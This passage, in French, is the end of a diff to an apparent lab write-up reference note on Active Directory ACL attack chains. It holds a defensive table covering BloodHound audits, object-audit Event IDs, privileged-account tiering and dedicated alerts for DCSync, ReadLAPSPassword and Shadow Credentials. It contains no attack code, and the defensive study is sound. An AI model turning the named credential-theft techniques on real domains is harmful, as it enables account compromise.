+| Audit régulier des ACL                     | Exécuter BloodHound côté défense (ou son équivalent) pour détecter les chemins d'attaque avant qu'un attaquant ne le fasse |
+| Activation de l'audit d'objet AD           | Sans l'audit avancé activé sur les OU sensibles, les Event ID 4662/4670/5136 ne sont tout simplement pas générés           |
+| Groupes Protected Users / Tiering          | Isoler les comptes à privilèges des chemins d'ACL accessibles aux comptes standards                                        |
+| Surveillance des extended rights sensibles | DCSync, ReadLAPSPassword et Shadow Credentials doivent faire l'objet d'alertes dédiées, pas d'un audit générique           |
+
+> [!NOTE]
+> Ce document sert de référence pour tous les writeups à venir impliquant une chaîne d'ACL. La mécanique de chaque droit n'y sera plus réexpliquée en détail : seule l'application concrète au contexte du lab sera décrite, avec un renvoi implicite à cet off-log pour la théorie.
+
+---
+
+_Off-log rédigé par **Zcook**_
